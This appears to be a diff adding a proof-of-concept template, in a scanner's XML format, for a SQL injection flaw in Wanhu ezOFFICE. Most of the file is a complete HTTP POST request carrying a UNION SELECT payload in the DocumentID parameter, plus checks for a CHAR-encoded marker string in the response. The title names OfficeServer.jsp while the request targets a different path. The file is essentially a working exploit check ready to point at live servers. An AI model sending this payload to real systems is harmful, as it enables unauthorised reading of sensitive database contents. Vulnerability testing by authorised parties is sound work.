@@ -1,0 +1,16 @@
+﻿<DudePoc_Name>万户 ezOFFICE OfficeServer.jsp 存在SQL注入漏洞 测二</DudePoc_Name>
+<DudePoc_Description>北京万户网络技术有限公司ezOFFICE OfficeServer.jsp 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /defaultroot/public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=11'+UNION+ALL+SELECT+NULL,NULL,CHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113)%2BCHAR(68)%2BCHAR(72)%2BCHAR(116)%2BCHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113)%2BCHAR(68)%2BCHAR(72)%2BCHAR(116)%2BCHAR(113)%2BCHAR(107)%2BCHAR(113)%2BCHAR(112)%2BCHAR(113),NULL--+QAJc&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1 HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>qkqpqDHtqkqpq</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
